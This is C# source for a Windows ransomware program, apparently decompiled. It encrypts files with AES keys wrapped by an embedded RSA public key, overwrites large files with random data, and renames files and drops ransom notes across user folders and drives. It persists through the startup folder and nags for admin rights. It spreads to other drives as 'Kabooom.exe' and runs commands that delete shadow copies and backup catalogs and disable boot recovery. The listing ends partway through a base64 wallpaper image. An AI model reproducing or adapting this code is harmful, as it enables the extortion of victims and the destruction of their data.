using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp;

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);

		static NativeMethods()
		{
			intpreclp = new IntPtr(-3);
		}
	}

	private static string userName;

	private static string userDir;

	public static string appMutexRun;

	public static bool encryptionAesRsa;

	public static string encryptedFileExtension;

	private static bool checkSpread;

	private static string spreadName;

	private static bool checkCopyRoaming;

	private static string processName;

	public static string appMutexRun2;

	private static bool checkStartupFolder;

	private static bool checkSleep;

	private static int sleepTextbox;

	private static string base64Image;

	public static string appMutexStartup;

	private static string droppedMessageTextbox;

	private static bool checkAdminPrivilage;

	private static bool checkdeleteShadowCopies;

	private static bool checkdisableRecoveryMode;

	private static bool checkdeleteBackupCatalog;

	public static string appMutexStartup2;

	public static string appMutex2;

	public static string staticSplit;

	public static string appMutex;

	public static readonly Regex appMutexRegex;

	private static string[] messages;

	private static string[] validExtensions;

	private static Random random;

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>zPq+o1Uri8oQQFVD0YhjX76kHSEpBhYz8KOdGff34mcmC3fILc7EXpkbereKWiaCG3tZjCvVwxxMrgDLRAjKnio0LxRfTum2ZboHdHSVRSshZlZPf0BI3mNjr12GcAS+cZwBcQAbfEdsAOaK9hMhc5VdvZRVwPBUPWd26A186jk=</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}

	static Program()
	{
		userName = Environment.UserName;
		userDir = "C:\\Users\\";
		appMutexRun = "7z459ajrk722yn8c5j4fg";
		encryptionAesRsa = true;
		encryptedFileExtension = "";
		checkSpread = true;
		spreadName = "Kabooom.exe";
		checkCopyRoaming = true;
		processName = "010101.exe";
		appMutexRun2 = "2X28tfRmWaPyPQgvoHV";
		checkStartupFolder = true;
		checkSleep = false;
		sleepTextbox = 10;
		base64Image = "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAQwAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMAAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAf/bAEMBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAf/AABEIAfoCEwMBEQACEQEDEQH/xAAfAAEAAQIHAQAAAAAAAAAAAAAAAgEDBAUGBwgKCwn/xABHEAABAwMCBAMFBwMDAQYEBwABAAIDBAURBgcIEiExE0FRCSJhkaEKFHGBsdHwMsHhFSNCUhYXJDNi8UNTdJI0coKTorPi/8QAHQEBAAICAwEBAAAAAAAAAAAAAAIDAQQFBgcICf/EAEwRAAIBAgMECAUCBAQCBgkFAAABAgMRBCExBRJBUQYTYXGBkaHwByKxwdEU4QgyUvEVI0JiM3IWJFOCkqI0NUN0dbPC0uI2ZJOytP/aAAwDAQACEQMRAD8A6L69AOHCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCALDklq/qAsb8efo/wApJp5oBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQD8ifgBkn4AeZ9AgWbS5nMvg69n5xc8e2sJ9GcL+zmptwqq3shkv1+gijt2lNMRzkiF+odSV5itVtL8OIglndUuY172wkAE6WJxVGhK1SVnbl3/27y2NKUlf39UdgrT/2Oz2ily0oy+3reLhp09qN1OKh2jptR6zuMsThEXmkqLxbdHzWyOdz2iIvhqKmAOf1ka0F7dFbUwzu96S1ycXbsayu+1F6pRtZxTy7b8e3Ky4p/RHwK44/Z18WXs8twYdBcTW19w0i+5tlm01qy2SuvmhNWU0Qe579O6opWChrZY2N55qKTwa6AdJacYcVu4bHUMRJUqcm5brlmml25vlz0IVKcVH5Uk7rPPv1zODbJWyduYHGcOaWkduhB6gjPUFbxruLWpcQwEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEBv3wu8Ou4vFpxD7N8N21NC6t17vNr+xaG0+4xiSmtpuNQJbvqG5Fzo4orNpWxwXHUt8mlljbDaLXWSNL3tax2jjMSqNOcrtNRaVueefb/ctpU3JqWVlJKz4vL3meyZwFcDuyns/eG3QfDrspZaensumbXTu1DqmWlpo9QbhapmjD7zrPU1XA0Pqrleat0tQyKSSWK30j4LfTEU9MwHp+Jr1q00221ZJ3vpfnnn2t656Oy34QSWi7LaW000/BzP5W4xgYGDjHp2UFeyvrbPvJ2VrWVuRxf4teD3YDjX2g1HsnxEbfWbXuiNRU0kfg10RiutkrzGW01803eIeWvsV8oXHno7jQyskid0kZLHzRutp15UWpQ3lJcYq11ndN2zXK3ZbS5TKOraVru3jfS3cuX2OhNxufY/OKPQOpL1qDgY3M0Tvht/U1c01n0FujqKk233UstLI+aWK1nUFbSSaC1e2lZyxNu09Zo+uqA6NklundE+pfzGE2nKCk6qbVtbO3HN2i7K2ry0z7aXS3pcLN5Z6ZaLT65vhojq48UPCTvZwZ7k1G0PEBQaN0/uTRUrKu76T0tuht1ubW6fZK4iCDUVTtxqbVFusNxnYPGZZ7rV0V4jgcyWpt1O2Rmebp1+ss7WSztzuvt39vIpqQ3UtOKy4++9nHBbCd1cqCyAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCA7qX2OHg2o9ab57+cbmp7bHPBtDYYdl9sZ6ynD2U2rdeUTLlr65UT5G4ZW02jG0Fh8WP3hRaku9KSRNI1db2tXzcGmkm7c+ElbxtrbNZXNygskss3f9n4WS59h6ILY+QNDQ1rW4Aa0YAaOgAAAAAAwAOgHRcEndJ81c3CUsjIY3yvIayNrnuJIADWgucSXENAABJJIAAJJAWQ8jqEe1m+1L7V8JWttSbCcHelbTv1u7pqtrLPq7XN4r6im2u0XfaQuhq7VRzUBdU6uu1uqGmKuiopIbXTzskp31jpmHHL4PZ86qU5xaiv8Abm73s8/ty7r0N3bzdtVf+/A6jPE/9od9q1xTW+42DUfETU7W6Pu8MtLXaX2KtUe24qaKdsjJ6Wp1JSz1+q3McyQwv+63miE8YBka33mO5ejs+jHWKaVrXu3vLV/Ne3PJWT4XKqlTcWSztl4310vxufE+rnmrKqpr6qaaqrK6earrKuqlfUVdXUzv8SaoqqqUunqaiV7i+Wed75ZHkue4uJK3lShHJK3db8GtOe/b5k7XvbtsYdWEAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAoXNYC9wJawFzgO5a0ZIHxIBwjyTfIJXaXN2PWm+za8N9Nw7+yf4eX1Nq/07U28kV63t1IZAG1Ek+ua+WptDJgC4t+6WFlvo42l5xFC3o0dF0zalRyrSTSWcVk3a6V3m9c3Z5KzVjkqdOyve+aeiWluSWq7+fYfe9pw0n4/suOU7JK2llr+xcdbr7S37Tit4BuDJu3O2F+fauIfiufetudC1dG9jLnonb+30DZt0Nxqd7Xiop6umt1ztmkdN1DTH911DqaO7QioNmqITy+z8Mq1SDmvki76XTb0T4Lm9X/AC5pZFVTLPX9vzwtbjzZ5WMk81TJJPO+WaWeaSd808z5pnule6R75ZZC6SaaRzi+WaRxkle5z3kuc4nt8VCnT3Irhb0t6e7Zms6yV8s1wv8AsS5x/wBI/n5KJTUqb6ata6trf7Io52cdMYQpjHdvne5FCQQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBYk7JsGpdF6cn1lrHSuj6QF1XqnUun9N0rGguc6ov13pLXF7rQXFofVNLi0Ejy8lq1q7hCbvZqLfJaZZ3vn7yJxjo3pw77nuC8PW3dFtPsftJtnbqZlHRaC250ZpWCna0tZGbNYKCjmDWe6Gt+8RSkAAZzkjK6TiK0q05SlFRbk20ud3c31Jxyy5m8rpfCjc4loDfeJPTA6Z7kjPp6nA7qqCvKK7TLqNZ2WS7/AMHlEfaeeJm8cQftZt4NLm5T1OjuHWxaa2Q0nb3uzS2+W1Wuj1HrWohjyWNqblrS/XJlRUNxJJBa6SBxLKdob2/ZdFRpJu6cexWk5fM3filey+pTUq71raNPJ6paefFrhdHXreAGgDtn91y5rzVopLn9mW0KggCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAsNXVgfRD2Sm1bd6faU8GO3MtLHV016350LW1sMzGyQGgsVzZeawzBzHgNbDROeHDHKW82ei4vH/ACQbWjTvzdkvzwsbFJKUWnfJ2yfjn42y88j2gYomtYGjoG9ABgDy8sfL0HRdSlBOT11fL8G1GKd78LaePeW6loEbh7pB5M8/VuC8A5xjy7fHClCKjJNXur6tZZa9neRnFXcc+HfwZ4s/tQ9Sz6w9o/xzajqJjO64cUu9TYpCckUtJry9UdLGCSSWxU8EUTMknkY0eWF3TAu9GPcn53593dyyKJJKTXLLPXuOB7+w/H+xW4Vz0Xf9mWkKggCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgCAIAgOwP9mH0FFrn2wGwc88Jmh0NpvcvXUg5fdjfaNG3OCkkc7GGFlbWU5Ycgl+GjOevFbSzha9nnbyinxXPzfOxs0NJd6PWLgeyWMPY4Oa4nBHw6HIOCCCDkEArqr1fe/qbcOPh9zCXKspaGkqq2smZT0lFTTVdVNJ0ZDT0zHTTyv6E8kcTHvcQDgAkZwsx/mS53Wl9U+BGf8AM/D6I8Pnip1ZS664oOI3WVHK2el1VvnutqCkmY/xGTUt11ve6ynlbJ/ybJFK14zhwBw4AggdxwCtRXKyWvJy98jXm1vtc9F4I2Df2H4/2K3Sqei7/sy0hUEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEAQBAEB9rPYc+zm1z7RviK3Q0TtzxBax4adY7VbSVG5WmtytFOvEFzhvceprBYKO2zV1gu1lvFBSVAu0ks1Tb601DfBAFPKwvC4naTcYqVrpNJ52WdlxdvNZ9hfTeS+ZJZ3yu73dvvy4naFZw7faq+BZ73bW8SWkOOTQlnqI/u9n15cLVrS919FEG8jXnWEOm9evllbGYCwaqqi1z+bJyHrhksLNx3nZZ5WazSu9HfkuHZ27SbSdmcOuMX24/t6rFspr3Zfd3gHqtk9QaxsV20feN29M7Y7lVk1stN0pJbdeJ9Psh/1uxUNyqqSWoipbjLdqoUbZXVE